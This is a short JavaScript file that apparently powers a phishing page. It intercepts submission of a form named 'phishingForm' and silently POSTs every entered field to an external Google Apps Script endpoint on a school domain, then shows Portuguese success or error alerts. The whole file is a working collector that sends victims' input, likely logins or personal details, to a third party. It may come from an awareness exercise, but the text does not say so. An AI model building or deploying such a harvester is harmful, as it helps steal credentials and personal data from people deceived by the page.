const scriptURL = "https://script.google.com/a/macros/escola.pr.gov.br/s/AKfycbyJgU2m8DEAY0CyfsGqTlicSWU4JKNo3njvIgV4qneGXvzJPeM7cStSSQo5pPUJEyk8Ew/exec";

document.getElementById("phishingForm").addEventListener("submit", function(event) {
    event.preventDefault();
    const form = event.target;
    const data = new FormData(form);

    fetch(scriptURL, {
        method: "POST",
        body: data
    })
    .then(response => {
        alert("✅ Dados enviados com sucesso!");
        form.reset();
    })
    .catch(error => {
        alert("❌ Erro ao enviar os dados.");
        console.error("Erro:", error);
    });
});


